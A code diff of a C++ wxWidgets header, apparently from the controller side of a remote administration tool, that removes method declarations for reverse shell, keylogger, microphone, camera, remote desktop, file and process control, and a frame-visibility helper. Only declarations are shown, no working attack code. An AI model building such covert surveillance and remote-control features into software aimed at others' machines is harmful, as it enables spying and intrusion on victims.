@@ -111,26 +111,11 @@ public:
     }
 
     //Opciones de menu contextual
-    void OnShellInversa(wxCommandEvent& event);
-    void OnMicrofono(wxCommandEvent& event);
-    void OnKeylogger(wxCommandEvent& event);
-    void OnCamara(wxCommandEvent& event);
-    void OnEscritorioRemoto(wxCommandEvent& event);
-    void OnAdminVentanas(wxCommandEvent& event);
-    void OnInfo(wxCommandEvent& event);
-    void OnEscanerRed(wxCommandEvent& event);
-    void OnBromas(wxCommandEvent& event);
-    void OnAdminArchivos(wxCommandEvent& event);
-    void OnProxyInversa(wxCommandEvent& event);
-    void OnAdminProcesos(wxCommandEvent& event);
-
     void OnModMenu(wxCommandEvent& event);
-
 
     void ShowContextMenu(const wxPoint& pos, long item);
     void OnContextMenu(wxContextMenuEvent& event);
     void OnInteractuar(wxCommandEvent& event);
-    void OnMatarProceso(wxCommandEvent& event);
     void OnRefrescar(wxCommandEvent& event);
     void OnActivated(wxListEvent& event);
 
@@ -151,7 +136,6 @@ class Cliente_Handler {
         std::thread p_thQueue;
         
         std::mutex mt_Queue;
-        std::mutex mt_FrameVisible; 
         std::mutex mt_Archivos;
 
         std::map<int, std::vector<char>> paquetes_Acumulados;
@@ -167,18 +151,7 @@ class Cliente_Handler {
     public:
         std::mutex mt_Running;
 
-        FrameCliente *n_Frame = nullptr;
-
-        //Verificar que el frame principal siga activo
-        bool m_isFrameVisible() {
-            std::unique_lock<std::mutex> lock(mt_FrameVisible);
-            return isFrameVisible;
-        }
-
-        void m_setFrameVisible(bool val) {
-            std::unique_lock<std::mutex> lock(mt_FrameVisible);
-            isFrameVisible = val;
-        }
+        //FrameCliente *n_Frame = nullptr;
 
         //Manipulacion "segura" de vector que almacena informacion de archivos que se estan transfiriendo
         void Transfers_Fin(const std::string& strID);
